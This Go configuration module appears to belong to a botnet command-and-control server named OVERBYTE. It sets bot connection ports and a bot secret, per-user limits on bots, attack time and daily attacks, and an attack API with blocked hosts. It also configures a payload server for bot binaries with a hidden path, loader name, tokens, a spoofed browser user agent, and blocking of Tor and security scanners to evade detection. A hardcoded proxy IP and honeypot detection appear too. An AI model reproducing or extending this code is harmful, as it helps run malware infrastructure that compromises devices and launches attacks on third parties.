package config

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type CNCConfig struct {
	BotPort            int      `json:"bot_port"`
	SSHPort            int      `json:"ssh_port"`
	SSHHostKey         string   `json:"ssh_host_key"`
	SSHPubkeyAuthRoles []string `json:"ssh_pubkey_auth_roles"`
	PingInterval       int      `json:"ping_interval"`
	PingTimeout        int      `json:"ping_timeout"`
	MaxSessions        int      `json:"max_sessions"`
	MaxGlobalSlots     int      `json:"max_global_slots"`
	BotSecret          string   `json:"bot_secret"`
}

type DatabaseConfig struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	User     string `json:"user"`
	Password string `json:"password"`
	Name     string `json:"name"`
}

type DefaultsConfig struct {
	MaxTime    int `json:"max_time"`
	MaxBots    int `json:"max_bots"`
	MaxSlots   int `json:"max_slots"`
	DailyLimit int `json:"daily_limit"`
}

type LoggingConfig struct {
	Level      string `json:"level"`
	Format     string `json:"format"` // json | text (stderr + optional file)
	File       string `json:"file"`   // empty = stderr only
	MaxSizeMB  int    `json:"max_size_mb"`
	MaxBackups int    `json:"max_backups"`
	MaxAgeDays int    `json:"max_age_days"`
	Compress   bool   `json:"compress"`
	RingLines  int    `json:"ring_lines"` // recent lines for SSH UI
}

type ProxyConfig struct {
	Enabled      bool   `json:"enabled"`
	BindAddr     string `json:"bind_addr"`
	BindPort     int    `json:"bind_port"`
	AuthEnabled  bool   `json:"auth_enabled"`
	AuthUsername string `json:"auth_username"`
	AuthPassword string `json:"auth_password"`
}

type APIConfig struct {
	Enabled      bool     `json:"enabled"`
	Port         int      `json:"port"`
	RateLimit    int      `json:"rate_limit"`
	Cooldown     int      `json:"cooldown"`
	Whitelist    []string `json:"whitelist"`
	BlockedHosts []string `json:"blocked_hosts"`

	EnableReadAPI bool `json:"enable_read_api"`

	MaxConnPerIP   int `json:"max_conn_per_ip"`
	BurstLimit     int `json:"burst_limit"`
	BlockDuration  int `json:"block_duration"`
	MaxRequestSize int `json:"max_request_size"`

	EnableSecurityHeaders bool     `json:"enable_security_headers"`
	TrustedProxies        []string `json:"trusted_proxies"`
}

type SecurityConfig struct {
	HoneypotDetection    bool          `json:"honeypot_detection"`
	SuspicionThreshold   float64       `json:"suspicion_threshold"`
	BlacklistDuration    time.Duration `json:"blacklist_duration"`
	PreventDuplicates    bool          `json:"prevent_duplicates"`
	ReplaceOldConnection bool          `json:"replace_old_connection"`
	FirewallEnabled      bool          `json:"firewall_enabled"`
	FirewallPersistFile  string        `json:"firewall_persist_file"`
}

type PayloadConfig struct {
	Enabled        bool     `json:"enabled"`
	Port           int      `json:"port"`
	Host           string   `json:"host"`
	UserAgent      string   `json:"user_agent"`
	Blacklist      []string `json:"blacklist"`
	BinsDirectory  string   `json:"bins_directory"`
	HiddenPath     string   `json:"hidden_path"`
	LoaderName     string   `json:"loader_name"`
	TokenEnabled   bool     `json:"token_enabled"`
	TokenTTL       int      `json:"token_ttl_minutes"`
	BlockTor       bool     `json:"block_tor"`
	BlockScannerUA bool     `json:"block_scanner_ua"`
	TrustedProxies []string `json:"trusted_proxies"`
}

type Config struct {
	CNC          CNCConfig      `json:"cnc"`
	Database     DatabaseConfig `json:"database"`
	Defaults     DefaultsConfig `json:"defaults"`
	Logging      LoggingConfig  `json:"logging"`
	Proxy        ProxyConfig    `json:"proxy"`
	API          APIConfig      `json:"api"`
	Security     SecurityConfig `json:"security"`
	Payload      PayloadConfig  `json:"payload"`
	RootUsername string         `json:"root_username"`
}

func (c *Config) GetPingInterval() time.Duration {
	return time.Duration(c.CNC.PingInterval) * time.Second
}

func (c *Config) GetPingTimeout() time.Duration {
	return time.Duration(c.CNC.PingTimeout) * time.Second
}

func Load(path string) (*Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	config := &Config{}
	decoder := json.NewDecoder(file)
	if err := decoder.Decode(config); err != nil {
		return nil, err
	}

	if config.CNC.BotPort == 0 {
		config.CNC.BotPort = 7777
	}
	if config.CNC.SSHPort == 0 {
		config.CNC.SSHPort = 999
	}
	if config.CNC.SSHHostKey == "" {
		config.CNC.SSHHostKey = "ssh_host_key"
	}
	if config.CNC.PingInterval == 0 {
		config.CNC.PingInterval = 30
	}
	if config.CNC.PingTimeout == 0 {
		config.CNC.PingTimeout = 60
	}
	if config.CNC.MaxSessions == 0 {
		config.CNC.MaxSessions = 10
	}
	if config.CNC.MaxGlobalSlots == 0 {
		config.CNC.MaxGlobalSlots = 50
	}
	if config.Defaults.MaxTime == 0 {
		config.Defaults.MaxTime = 300
	}
	if config.Defaults.MaxBots == 0 {
		config.Defaults.MaxBots = 50
	}
	if config.Defaults.MaxSlots == 0 {
		config.Defaults.MaxSlots = 5
	}
	if config.Defaults.DailyLimit == 0 {
		config.Defaults.DailyLimit = 100
	}

	if config.Logging.Level == "" {
		config.Logging.Level = "INFO"
	}
	if config.Logging.Format == "" {
		config.Logging.Format = "json"
	}

	if config.RootUsername == "" {
		config.RootUsername = "admin"
	}

	if config.Proxy.BindAddr == "" {
		config.Proxy.BindAddr = "121.127.34.230"
	}
	if config.Proxy.BindPort == 0 {
		config.Proxy.BindPort = 1080
	}

	if config.API.Port == 0 {
		config.API.Port = 8080
	}
	if config.API.RateLimit == 0 {
		config.API.RateLimit = 30
	}
	if config.API.Cooldown == 0 {
		config.API.Cooldown = 5
	}
	if config.API.MaxConnPerIP == 0 {
		config.API.MaxConnPerIP = 10
	}
	if config.API.BurstLimit == 0 {
		config.API.BurstLimit = 20
	}
	if config.API.BlockDuration == 0 {
		config.API.BlockDuration = 300
	}
	if config.API.MaxRequestSize == 0 {
		config.API.MaxRequestSize = 1024 * 10
	}

	if config.Security.SuspicionThreshold == 0 {
		config.Security.SuspicionThreshold = 75.0
	}
	if config.Security.BlacklistDuration == 0 {
		config.Security.BlacklistDuration = 24 * time.Hour
	}

	if config.Payload.UserAgent == "" {
		config.Payload.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	if config.Payload.TokenTTL == 0 {
		config.Payload.TokenTTL = 60
	}

	if dbHost := os.Getenv("OVERBYTE_DB_HOST"); dbHost != "" {
		config.Database.Host = dbHost
	}
	if dbPortStr := os.Getenv("OVERBYTE_DB_PORT"); dbPortStr != "" {
		var p int
		if _, err := fmt.Sscanf(dbPortStr, "%d", &p); err == nil {
			config.Database.Port = p
		}
	}
	if dbUser := os.Getenv("OVERBYTE_DB_USER"); dbUser != "" {
		config.Database.User = dbUser
	}
	if dbName := os.Getenv("OVERBYTE_DB_NAME"); dbName != "" {
		config.Database.Name = dbName
	}

	config.Database.Password = os.Getenv("OVERBYTE_DB_PASSWORD")
	if config.Database.Password == "" {
		return nil, fmt.Errorf("OVERBYTE_DB_PASSWORD environment variable is required")
	}

	config.CNC.BotSecret = os.Getenv("OVERBYTE_BOT_SECRET")
	if config.CNC.BotSecret == "" {
		return nil, fmt.Errorf("OVERBYTE_BOT_SECRET environment variable is required")
	}

	if proxyUser := os.Getenv("OVERBYTE_PROXY_USERNAME"); proxyUser != "" {
		config.Proxy.AuthUsername = proxyUser
	}
	if proxyPass := os.Getenv("OVERBYTE_PROXY_PASSWORD"); proxyPass != "" {
		config.Proxy.AuthPassword = proxyPass
	}

	return config, nil
}

// Validate checks config values for validity (port ranges, paths, positive numbers).
func (c *Config) Validate() error {
	if c.CNC.BotPort < 1 || c.CNC.BotPort > 65535 {
		return fmt.Errorf("cnc.bot_port must be 1-65535, got %d", c.CNC.BotPort)
	}
	if c.CNC.SSHPort < 1 || c.CNC.SSHPort > 65535 {
		return fmt.Errorf("cnc.ssh_port must be 1-65535, got %d", c.CNC.SSHPort)
	}
	if c.CNC.PingInterval < 1 {
		return fmt.Errorf("cnc.ping_interval must be positive, got %d", c.CNC.PingInterval)
	}
	if c.CNC.PingTimeout < 1 {
		return fmt.Errorf("cnc.ping_timeout must be positive, got %d", c.CNC.PingTimeout)
	}
	if c.CNC.MaxSessions < 0 {
		return fmt.Errorf("cnc.max_sessions cannot be negative, got %d", c.CNC.MaxSessions)
	}
	if c.CNC.MaxGlobalSlots < 0 {
		return fmt.Errorf("cnc.max_global_slots cannot be negative, got %d", c.CNC.MaxGlobalSlots)
	}
	if c.Database.Port < 1 || c.Database.Port > 65535 {
		return fmt.Errorf("database.port must be 1-65535, got %d", c.Database.Port)
	}
	if c.Defaults.MaxTime < 0 {
		return fmt.Errorf("defaults.max_time cannot be negative, got %d", c.Defaults.MaxTime)
	}
	if c.Defaults.MaxBots < 0 {
		return fmt.Errorf("defaults.max_bots cannot be negative, got %d", c.Defaults.MaxBots)
	}
	if c.Defaults.MaxSlots < 0 {
		return fmt.Errorf("defaults.max_slots cannot be negative, got %d", c.Defaults.MaxSlots)
	}
	if c.Defaults.DailyLimit < 0 {
		return fmt.Errorf("defaults.daily_limit cannot be negative, got %d", c.Defaults.DailyLimit)
	}
	if c.CNC.SSHHostKey != "" {
		if _, err := os.Stat(c.CNC.SSHHostKey); err == nil {
			// path exists
		} else if !os.IsNotExist(err) {
			return fmt.Errorf("cnc.ssh_host_key path error: %w", err)
		}
	}
	if c.Logging.File != "" {
		f := strings.ToLower(strings.TrimSpace(c.Logging.Format))
		if f != "" && f != "json" && f != "text" {
			return fmt.Errorf("logging.format must be json or text, got %q", c.Logging.Format)
		}
		dir := filepath.Dir(c.Logging.File)
		if dir != "." && dir != "" {
			if err := os.MkdirAll(dir, 0755); err != nil {
				return fmt.Errorf("logging directory %s: %w", dir, err)
			}
		}
	}
	if c.API.Enabled {
		if c.API.Port < 1 || c.API.Port > 65535 {
			return fmt.Errorf("api.port must be 1-65535, got %d", c.API.Port)
		}
		if c.API.RateLimit < 0 {
			return fmt.Errorf("api.rate_limit cannot be negative, got %d", c.API.RateLimit)
		}
	}
	if c.Proxy.Enabled {
		if c.Proxy.BindPort < 1 || c.Proxy.BindPort > 65535 {
			return fmt.Errorf("proxy.bind_port must be 1-65535, got %d", c.Proxy.BindPort)
		}
	}
	if c.Payload.Enabled && c.Payload.BinsDirectory != "" {
		if _, err := os.Stat(c.Payload.BinsDirectory); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("payload.bins_directory %s: %w", c.Payload.BinsDirectory, err)
		}
	}
	return nil
}
